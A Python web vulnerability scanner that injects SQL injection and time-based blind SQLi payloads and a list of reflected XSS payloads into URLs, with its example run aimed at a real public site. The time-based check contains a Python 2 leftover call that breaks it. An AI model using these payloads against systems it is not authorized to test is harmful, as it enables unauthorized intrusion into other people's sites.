# -*- coding: utf-8 -*-

#Imports
import bcolors
import os
import urllib.request
#import getproxy
import time
import socket
import TestObject

#Constants
headers = { 'User-Agent' : 'Mozilla/5.0' }

# Tests for normal error-based sql injection vulnerability
def sql_error_scan(url,v = False) :
    errorStrings = ["SQL Syntax", "SQL SYNTAX", "SQL Error", "SQL Error", "SQL ERROR", "sql_"]
    req = urllib.request.Request(url + "'", None, headers)

    try :
        src = urllib.request.urlopen(req).read()
    except:
        return None

    for err in errorStrings :
        if err in str(src) :
            if (v) :
                bcolors.printGreen("[+]Found '" + err + "' reference in url: " + url)
            return "'"

# Tests for blind time-based sql injection vulnerability
def sql_time_scan(url, v = False) :
    sleepCommands = ["-SLEEP(5000)", 
                     "-BENCHMARK(1000000000000000, rand())",
                     "; WAIT FOR DELAY '00:10:00'",
                     "'BEGIN DBMS_LOCK.SLEEP(15); END;--" ]
    
    #Get normal load-time
    req = urllib.request.Request(url, None, headers)
    timeStart = time.time()
    try :
        response = urllib.request.urlopen(req)
    except :
        return None

    latency = time.time() - timeStart
    if (v):
        print("[*]Latency is " + str(latency))
    socket.setdefaulttimeout(3*latency)

    for test in sleepCommands :
        req = urllib.request.Request(url + test, None, headers)
        try :
            response = urllib.urlopen(req)
        except socket.timeout :
            if (v) :
                bcolors.printGreen("[+] Time-based sql vulnerability found in url: ")
            return test
        except:
            continue
    return None

# The function which handles the reflected XSS vulnerability test,
# which looks for our script injection in the produced source
def xss_vuln_scan(url, v = False) :
    #source: http://breakthesecurity.cysecurity.org/2012/02/complete-cross-site-scriptingxss-cheat-sheets-part-1.html
    xssStrings = ['>"><script>alert("1VULN")</script>&',
                  '<script>alert(“1VULN”)</script>',
                  '<script>alert(‘1VULN’)</script>',
                  '“><script>alert(“1VULN”)</script>',
                  '<script>alert(/1VULN”)</script>',
                  '<script>alert(/1VULN/)</script>',
                  '<ScRiPt>alert("1VULN")</sCriPt>',
                  '<IMG SRC=jAVasCrIPt:alert(‘1VULN’)>',
                  '<IMG SRC=”javascript:alert(‘1VULN’);”>',
                  '<IMG SRC=javascript:alert(&quot;1VULN&quot;)>',
                  '<IMG SRC=javascript:alert(‘1VULN’)',
                  '<<SCRIPT>alert(“1VULN”);//<</SCRIPT>',
                  "'';!--\"<1VULN>=&{()}",
                  "%27%27%3B%21%2D%2D%22%3C%31%56%55%4C%4E%3E%3D%26%7B%28%29%7D",
                  "&#x27;&#x27;&#x3B;&#x21;&#x2D;&#x2D;&#x22;&#x3C;&#x31;&#x56;&#x55;&#x4C;&#x4E;&#x3E;&#x3D;&#x26;&#x7B;&#x28;&#x29;&#x7D;",
                  "&#39&#39&#59&#33&#45&#45&#34&#60&#49&#86&#85&#76&#78&#62&#61&#38&#123&#40&#41&#125",
                  "Jyc7IS0tIjwxVlVMTj49JnsoKX0="]

    for test in xssStrings :
        req = urllib.request.Request(url + test, None, headers)
        try :
            response = urllib.request.urlopen(req)
        except socket.timeout:
            return None # Don't keep going if site is down
        except :
            continue
        src = response.read()

        if ('<script>alert("1VULN")' in str(src) or '<IMG SRC=javascript:alert' in str(src) or "<1VULN>" in str(src)) :
            if (v) :
                bcolors.printGreen("[+]Found XSS vulnerability!")
            return test
    return None

# The main function which runs all the tests according to the level specified
def run_tests(links, testLevel = 1, v = False) :
    TestObjects = []
    if (links == [] or links == None) :
        bcolors.printFail("[-]Invalid input parameters! Exiting...")
        return
    for link in links :
        sqlI = True # Used to check if we need to perform a second time-based sqlInjection test
        res = sql_error_scan(link, v)
        if(res != None) :
            TestObjects.append(TestObject.TestObject(link, "SQLi", res))
            sqlI = False
        #Time based SQLi    
        if (testLevel > 1 and sqlI ) :
            res = sql_time_scan(link, v)
            if(res != None) :
                TestObjects.append(TestObject.TestObject(link, "SQLiT", res))
        #XSS
        if (testLevel > 2) :
            res = xss_vuln_scan(link, v)
            if(res != None) :
                TestObjects.append(TestObject.TestObject(link, "XSS", res))
    if (v) :
        if (TestObjects != []) :
            bcolors.printGreen("~*~*~*~*~PRINTING FOUND TARGETS~*~*~*~*~")
            for t in TestObjects :
                t.print_test()
        else :
            bcolors.printFail("~*~*~*~*~NO TARGETS FOUND~*~*~*~*~")
    return TestObjects
    
if __name__ == '__main__' :
    testURLS = ['http://php.net/manual/en/domnodelist.item.php']
    res = run_tests(testURLS, 3, True)
    #print(str(res))
